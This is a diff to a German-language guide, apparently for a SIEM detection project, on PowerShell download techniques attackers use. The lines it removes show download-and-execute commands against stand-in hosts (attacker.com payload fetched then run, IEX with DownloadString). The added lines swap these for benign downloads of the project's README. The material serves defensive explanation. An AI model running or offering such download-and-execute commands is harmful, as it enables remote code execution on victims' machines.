@@ -37,12 +37,7 @@ Angreifer nutzen verschiedene Techniken, um Inhalte via Powershell herunterzulad
   
 * Sytaxbeispiel: 
 ```powershell
-# Einfacher Download
-Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "C:\Users\Public\payload.exe"
-
-# Oft in Angriffen gesehen (vereinfacht)
-# IWR lädt Datei herunter, dann wird sie ausgeführt
-Invoke-WebRequest -Uri "http://attacker.com/payload.exe" -OutFile "$env:TEMP\p.exe"; Start-Process "$env:TEMP\p.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ByteRay-Labs/NG-SIEM/refs/heads/main/README.md" -OutFile "README.md"
 ```
 
 ###  `System.Net.WebClient` (.DownloadFile /.DownloadString)
@@ -51,16 +46,7 @@ Invoke-WebRequest -Uri "http://attacker.com/payload.exe" -OutFile "$env:TEMP\p.e
 
 * Sytaxbeispiel: 
 ```powershell
-# Download in Datei
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("http://example.com/payload.exe", "C:\Windows\Temp\payload.exe")
-
-# Download String zur Ausführung
-$payload = (New-Object System.Net.WebClient).DownloadString("http://attacker.com/malicious.ps1")
-Invoke-Expression $payload
-
-# Oft verkürzt / kombiniert:
-IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/malicious.ps1')
+(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/ByteRay-Labs/NG-SIEM/refs/heads/main/README.md", "$PWD\README.md")
 ```
 
 ### `Start-BitsTransfer`
@@ -70,10 +56,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/malicious.ps1
 
 * Syntaxbeispiel
 ```powershell
-Import-Module BitsTransfer
-Start-BitsTransfer -Source "[http://example.com/large_payload.zip](http://example.com/large_payload.zip)" -Destination "C:\Temp\large_payload.zip"
-# Kann asynchron ausgeführt werden
-Start-BitsTransfer -Source "http://..." -Destination "C:\..." -Asynchronous
+Start-BitsTransfer -Source "https://raw.githubusercontent.com/ByteRay-Labs/NG-SIEM/refs/heads/main/README.md" -Destination "$PWD\README.md"
 ```
 
 ## Verschleierungstechniken (MITRE ATT&CK T1027)
